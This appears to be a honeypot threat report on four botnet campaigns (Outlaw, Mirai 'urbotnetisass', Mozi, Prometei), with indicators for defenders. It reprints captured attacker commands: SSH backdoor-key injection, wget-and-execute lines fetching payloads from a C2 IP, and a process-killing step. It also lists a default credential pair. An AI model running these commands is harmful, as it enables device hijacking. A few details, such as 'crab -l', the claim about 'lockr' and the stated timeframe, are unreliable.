**Timeframe:** September 28, 2025 - October 12, 2025
**Files Used:** This report was generated by analyzing and aggregating data from all `Honeypot_Attack_Summary_Report_*.md` files provided for the specified timeframe.

## 1. Executive Summary

This report provides a comprehensive analysis of botnet activities observed across our global honeypot network over the past week. The threat landscape was dominated by several large-scale, automated campaigns, each with distinct tactics, techniques, and procedures (TTPs) and objectives. The primary goals of these campaigns were resource hijacking for cryptocurrency mining and the propagation of botnets for Distributed Denial-of-Service (DDoS) attacks.

Four major, concurrent botnet campaigns were identified:

1.  **The "Outlaw" Group Campaign:** This financially motivated group focused on gaining persistent access to Linux servers to deploy cryptocurrency miners. Their activity was easily identified by a unique SSH key signature and a specific set of commands designed to make their backdoor immutable.

2.  **Mirai Variant "urbotnetisass":** A massive campaign was observed targeting IoT devices with the "urbotnetisass" malware, a known variant of the Mirai botnet. Attackers systematically downloaded payloads for various architectures (ARM, MIPS, x86) with the clear objective of enslaving devices for DDoS attacks.

3.  **Mozi P2P Botnet:** The resilient Mozi botnet was also actively spreading, targeting IoT devices with weak Telnet credentials and known vulnerabilities. Its decentralized P2P architecture makes it a persistent threat.

4.  **Prometei Cryptomining Botnet:** This sophisticated, multi-platform botnet was identified targeting both Linux and Windows systems. It leverages well-known exploits like EternalBlue to propagate and deploy a Monero (XMRig) miner.

This report will provide a detailed breakdown of each botnet's observed activity, including specific Indicators of Compromise (IOCs) such as commands, SSH keys, IP addresses, and malware filenames for use in manual verification and threat hunting.

## 2. Detailed Botnet Activity Analysis

This section details the specific activities of each identified botnet threat actor.

### 2.1. The "Outlaw" Group (Cryptomining & Persistence)

The Outlaw group (also known as "Dota") was responsible for a significant number of successful SSH compromises. Their TTPs are highly consistent and serve their primary goal of establishing long-term persistence for cryptomining operations.

**Objective:**
To maintain permanent, passwordless access to compromised servers to deploy and run cryptocurrency miners.

**Key Indicators & TTPs:**

*   **Initial Access:** Brute-forcing weak or default SSH credentials.
*   **Persistence Tactic:** The most reliable indicator of the Outlaw group is their post-exploitation command, which wipes the existing SSH configuration and installs their own key.
*   **Attacker Signature:** The injected SSH key contains the unique and explicit comment **"mdrfckr"**.

**Captured Data for Verification:**

*   **SSH Public Key:**
    ```
    ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr
    ```
*   **Associated Commands:**
    ```bash
    # Command to delete old SSH config and inject the new key
    cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3... mdrfckr" >> .ssh/authorized_keys

    # Commands to make the new SSH key immutable
    cd ~; chattr -ia .ssh; lockr -ia .ssh
    lockr -ia .ssh
    ```
    *OSINT confirms that `lockr` is a legitimate enterprise tool that attackers attempt to leverage if present on a compromised system to secure their backdoor.*

### 2.2. Mirai Botnet Variant ("urbotnetisass")

This campaign represents a classic IoT botnet propagation effort. The primary goal is to infect as many vulnerable embedded devices as possible to build a powerful DDoS weapon.

**Objective:**
To infect IoT devices (routers, cameras, DVRs) and add them to a botnet for launching DDoS attacks.

**Key Indicators & TTPs:**

*   **Initial Access:** Exploiting command injection vulnerabilities and weak/default Telnet/SSH credentials on IoT devices.
*   **Payload Staging:** Using the world-writable `/data/local/tmp/` or `/tmp/` directories to download malware.
*   **Multi-Architecture Payload:** Downloading specific ELF binaries compiled for a wide range of IoT CPU architectures.

**Captured Data for Verification:**

*   **Malware Filenames:**
    *   `arm.urbotnetisass`
    *   `arm5.urbotnetisass`
    *   `arm6.urbotnetisass`
    *   `arm7.urbotnetisass`
    *   `mips.urbotnetisass`
    *   `mipsel.urbotnetisass`
    *   `x86_32.urbotnetisass`
    *   `boatnet.mpsl` (A related Mirai/Gafgyt variant)
*   **Associated Commands:**
    ```bash
    # Typical command to download and execute the malware
    cd /data/local/tmp/; rm *; busybox wget http://[C2_IP]/bins/arm.urbotnetisass; chmod 777 arm.urbotnetisass; ./arm.urbotnetisass

    # Dropper script execution
    cd /data/local/tmp/; busybox wget http://141.98.10.66/bins/w.sh; sh w.sh
    ```
*   **Known C2 Server:**
    *   `141.98.10.66` (Located in Lithuania, actively serving Mirai payloads from a `/bins/` directory).

### 2.3. Mozi P2P Botnet

The Mozi botnet was identified by its unique filenames and is known for its resilient P2P architecture, making it difficult to disrupt.

**Objective:**
Similar to Mirai, to infect IoT devices for DDoS attacks, but also for data exfiltration and delivering secondary payloads.

**Key Indicators & TTPs:**

*   **Architecture:** Utilizes a Distributed Sloppy Hash Table (DHT) for a decentralized P2P command structure.
*   **Initial Access:** Primarily targets weak Telnet passwords and a known list of IoT vulnerabilities.

**Captured Data for Verification:**

*   **Malware Filenames:**
    *   `Mozi.m`
    *   `Mozi.a+varcron`
    *   `Mozi.a+jaws`

---

### 2.4. Prometei Botnet (Cryptomining)

The Prometei botnet is a more sophisticated, multi-platform threat actor. Unlike the IoT botnets, its primary goal is Monero cryptomining.

**Objective:**
To infect both Windows and Linux servers for the purpose of mining Monero (XMR), while also stealing credentials for lateral movement.

**Key Indicators & TTPs:**

*   **Initial Access:** Exploits known vulnerabilities, most notably **EternalBlue (MS17-010)**, and conducts SSH brute-force attacks. This aligns with the high number of **DoublePulsar backdoor** alerts seen in the logs.
*   **Payload Delivery:** Observed downloading its payload via a PHP script.

**Captured Data for Verification:**

*   **Malware Filename / Download Pattern:**
    *   `k.php?a=x86_64...` (This pattern is a known IOC for the Prometei botnet delivering its ELF binary miner).
*   **Associated IDS Alerts:**
    *   `ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication` (Indicates scanning for the EternalBlue vulnerability used by Prometei).

## 3. General Indicators and Shared TTPs

*   **System Reconnaissance:** Nearly all successful compromises were immediately followed by a standard set of reconnaissance commands to fingerprint the system:
    ```bash
    uname -a
    whoami
    lscpu
    cat /proc/cpuinfo | grep name | wc -l
    free -m
    df -h
    crab -l
    ```
*   **Malware "Cockroaching":** Some malicious scripts contained commands designed to find and kill the processes of competing malware, ensuring their bot is the only one utilizing the compromised device's resources.
    ```bash
    rm -rf /tmp/secure.sh; pkill -9 secure.sh
    ```
*   **Targeted Default Credentials:** Attackers consistently used the credential pair `345gs5662d34` / `345gs5662d34`, which are the known default credentials for Polycom CX600 IP telephones, indicating a specific sub-campaign to compromise VoIP equipment.
